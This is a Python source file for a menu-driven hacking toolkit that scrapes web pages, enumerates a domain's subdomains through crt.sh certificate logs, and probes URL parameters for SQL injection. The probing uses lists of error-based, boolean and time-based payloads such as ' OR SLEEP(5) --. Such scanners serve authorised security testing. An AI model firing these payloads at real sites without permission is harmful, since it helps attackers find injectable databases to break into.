import requests
import csv
import time
from urllib.parse import urljoin
from bs4 import BeautifulSoup
import os


# Banner for the tool
def print_banner():
    banner = r"""

      ___           ___                                     ___           ___                         ___
     /__/\         /  /\         _____          ___        /  /\         /  /\                       /  /\
    _\_ \:\       /  /:/_       /  /::\        /  /\      /  /::\       /  /::\                     /  /:/_
   /__/\ \:\     /  /:/ /\     /  /:/\:\      /  /:/     /  /:/\:\     /  /:/\:\    ___     ___    /  /:/ /\
  _\_ \:\ \:\   /  /:/ /:/_   /  /:/~/::\    /  /:/     /  /:/  \:\   /  /:/  \:\  /__/\   /  /\  /  /:/ /::\
 /__/\ \:\ \:\ /__/:/ /:/ /\ /__/:/ /:/\:|  /  /::\    /__/:/ \__\:\ /__/:/ \__\:\ \  \:\ /  /:/ /__/:/ /:/\:\
 \  \:\ \:\/:/ \  \:\/:/ /:/ \  \:\/:/~/:/ /__/:/\:\   \  \:\ /  /:/ \  \:\ /  /:/  \  \:\  /:/  \  \:\/:/~/:/
  \  \:\ \::/   \  \::/ /:/   \  \::/ /:/  \__\/  \:\   \  \:\  /:/   \  \:\  /:/    \  \:\/:/    \  \::/ /:/
   \  \:\/:/     \  \:\/:/     \  \:\/:/        \  \:\   \  \:\/:/     \  \:\/:/      \  \::/      \__\/ /:/
    \  \::/       \  \::/       \  \::/          \__\/    \  \::/       \  \::/        \__\/         /__/:/
     \__\/         \__\/         \__\/                     \__\/         \__\/                       \__\/

                                        created by mr.Tools

    """
    print(banner)


# find subdomains
def find_subdomains_online(domain):
    """
    Find subdomains using crt.sh certificate logs.

    :param domain: The target domain
    :return: A list of found subdomains
    """
    url = f"https://crt.sh/?q=%25.{domain}&output=json"
    found_subdomains = set()  # Using a set to avoid duplicates

    try:
        response = requests.get(url, timeout=10)
        response.raise_for_status()  # Raise an error if the request failed

        # Parse JSON response to extract subdomains
        for entry in response.json():
            subdomain = entry['name_value']
            found_subdomains.update(subdomain.splitlines())  # Split by new lines in case of multiple entries

        return list(found_subdomains)
    except requests.RequestException as e:
        print(f"Error fetching data: {e}")
        return []


# Data Scraping Tool
def scrape_data(url, tag, class_name, pagination_class=None, max_pages=5):
    scraped_data = []
    current_url = url
    page_count = 0

    while current_url and page_count < max_pages:
        try:
            response = requests.get(current_url, timeout=10)
            response.raise_for_status()
            soup = BeautifulSoup(response.text, 'html.parser')
            elements = soup.find_all(tag, class_=class_name)
            page_data = [element.get_text(strip=True) for element in elements]
            scraped_data.extend(page_data)

            print(f"Scraped {len(page_data)} items from page {page_count + 1}")

            if pagination_class:
                next_page = soup.find("a", class_=pagination_class)
                if next_page and next_page.get("href"):
                    current_url = urljoin(url, next_page["href"])
                else:
                    break
            else:
                break

            page_count += 1
            time.sleep(2)

        except requests.RequestException as e:
            print(f"Error fetching {current_url}: {e}")
            break

    return scraped_data


def save_to_csv(data, filename="output.csv"):
    with open(filename, mode="w", newline="", encoding="utf-8") as file:
        writer = csv.writer(file)
        writer.writerow(["Data"])
        for item in data:
            writer.writerow([item])


# SQL Injection Tool
def is_sql_injection_vulnerable(url, params, method="GET", headers=None, delay=0):
    sql_payloads = [
        "' OR '1'='1", "' OR '1'='1' --", "' OR 1=1#", "admin' --", "1' OR '1'='1",
        "1' OR 1=1#", "admin' #", "' OR SLEEP(5) --", "' OR BENCHMARK(1000000,MD5(1)) --"
    ]
    vulnerable_payloads = []

    for param in params:
        for payload in sql_payloads:
            test_params = params.copy()
            test_params[param] = payload

            try:
                if method == "GET":
                    response = requests.get(url, params=test_params, headers=headers, timeout=10)
                else:
                    response = requests.post(url, data=test_params, headers=headers, timeout=10)

                if ("syntax error" in response.text or "mysql_fetch_array" in response.text or
                        "unclosed quotation mark" in response.text or "SQLSTATE" in response.text):
                    print(
                        f"Potential SQL Injection vulnerability detected on parameter '{param}' with payload '{payload}'")
                    vulnerable_payloads.append((param, payload))
                    break

                if delay and 'SLEEP' in payload:
                    start_time = time.time()
                    requests.get(url, params=test_params, headers=headers, timeout=10)
                    end_time = time.time()
                    if end_time - start_time > delay:
                        print(
                            f"Potential Blind SQL Injection vulnerability detected on parameter '{param}' with payload '{payload}'")
                        vulnerable_payloads.append((param, payload))

            except requests.RequestException as e:
                print(f"Request failed: {e}")
                continue

    return vulnerable_payloads


def test_sql_injection(url, payload):
    """
    Simple function to test SQL injection vulnerability.
    :param url: Target URL with the vulnerable parameter (e.g., 'http://example.com/page?id=')
    :param payload: SQL injection payload to test
    """
    full_url = f"{url}{payload}"
    response = requests.get(full_url)

    if "SQL syntax" in response.text or "MySQL" in response.text:
        print(f"Possible SQL Injection found with payload: {payload}")
    else:
        print(f"No vulnerability detected with payload: {payload}")


def save_results_to_csv(results, filename="vulnerabilities.csv"):
    with open(filename, mode="w", newline="", encoding="utf-8") as file:
        writer = csv.writer(file)
        writer.writerow(["Parameter", "Payload"])
        for param, payload in results:
            writer.writerow([param, payload])
    print(f"Results saved to {filename}")


# Main Tool Logic
def main():
    print(os.name)
    os.system('clear')
    print_banner()
    while True:
        print("\nChoose a tool:")
        print("1. Data Scraper")
        print("2. SQL Injection Tester")
        print("3. Find Subdomains")
        print("4. Exit")
        choice = input("Enter your choice (1/2/3/4):\n ")

        if choice == "1":
            url = input("Enter the URL to scrape: ")
            tag = input("Enter the HTML tag to search for (e.g., 'h2'): ")
            class_name = input("Enter the class name of the tag: ")
            pagination_class = input("Enter the pagination class name (leave blank if not applicable): ")
            max_pages = int(input("Enter the maximum number of pages to scrape: "))
            data = scrape_data(url, tag, class_name, pagination_class, max_pages)
            save_to_csv(data, filename="scraped_data.csv")
            print("Data scraping completed.")

        elif choice == "2":
            choose = input("choose:\n1/simple sql injection\n2/advance sql injection")
            if choose == "2":
                target_url = input("Enter the URL to test for SQL Injection: ")
                params = input("Enter the parameters as key=value (comma-separated): ")
                params_dict = dict(param.split('=') for param in params.split(','))
                headers = {"User-Agent": "Mozilla/5.0"}
                delay = int(input("Enter the expected delay for time-based payloads (in seconds): "))
                vulnerabilities = is_sql_injection_vulnerable(target_url, params_dict, headers=headers, delay=delay)
                if vulnerabilities:
                    print("SQL Injection vulnerabilities found:")
                    for param, payload in vulnerabilities:
                        print(f"Parameter: {param} | Payload: {payload}")
                    save_results_to_csv(vulnerabilities)
                else:
                    print("No SQL Injection vulnerabilities detected.")
            else:
                target_url = input("Enter the URL to test for SQL Injection(http://example.com/page?id=): ")
                payloads = ["1' OR '1'='1", "1' AND 1=2 --", "1' UNION SELECT null, version() --"]

                for payload in payloads:
                    test_sql_injection(target_url, payload)

        elif choice == "3":
            sub = input("Enter the Domain:")
            subdomains = find_subdomains_online(sub)
            print("Found subdomains:")
            for subdomain in subdomains:
                print(subdomain)

        elif choice == "4":
            print("Exiting the tool. Goodbye!")
            break

        else:
            print("Invalid choice, please try again.")


if __name__ == "__main__":
    main()
